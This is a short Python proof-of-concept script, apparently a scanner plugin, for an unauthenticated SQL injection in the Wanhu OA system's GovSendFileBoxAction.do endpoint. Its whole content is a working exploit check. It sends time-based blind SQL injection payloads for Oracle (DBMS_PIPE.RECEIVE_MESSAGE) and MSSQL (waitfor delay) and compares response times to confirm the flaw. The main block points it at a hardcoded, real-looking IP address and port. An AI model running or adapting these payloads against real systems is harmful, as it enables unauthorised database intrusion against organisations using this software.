#!/usr/bin/env python
# -*- coding: utf-8 -*-
#POC Name  :万户oa前台GovSendFileBoxAction.do无条件注入
#Author    : 这个程序员不太冷
#Referer   : http://www.wooyun.org/bugs/wooyun-2014-077217


import re
import time

def assign(service,arg):
    if service == "whezeip":
        return True,arg

def audit(arg):
    payload="defaultroot/GovSendFileBoxAction.do?editId=2&sendFileUserId=1&action=delBatch"
    target=arg+payload
    fst_sta=time.time()
    code, head, res, errcode, _ = curl.curl2(target)
    fst_end=time.time()

    #乌云上的注入是mssql的，而我找到是oracle,就都写了。
    payloads=["defaultroot/GovSendFileBoxAction.do?editId=2&sendFileUserId=1)%20AND%205943=DBMS_PIPE.RECEIVE_MESSAGE(CHR(66)||CHR(106)||CHR(111)||CHR(73),5)%20AND%20(9258=9258&action=delBatch",
             "defaultroot/GovSendFileBoxAction.do?editId=2&sendFileUserId=1)%20waitfor%20delay%20'0:0:5'--&action=delBatch"
             ]
    for payload in payloads:
        target=arg+payload
        sec_sta=time.time()
        code, head, res, errcode, _ = curl.curl2(target)
        sec_end=time.time()

        fst=fst_end-fst_sta
        sec=sec_end-sec_sta
        
        if code==500 and fst<2 and sec>5:
            security_hole(target)

if __name__ == '__main__':
    from dummy import *
    audit(assign('whezeip','http://60.172.210.251:7001/')[1])
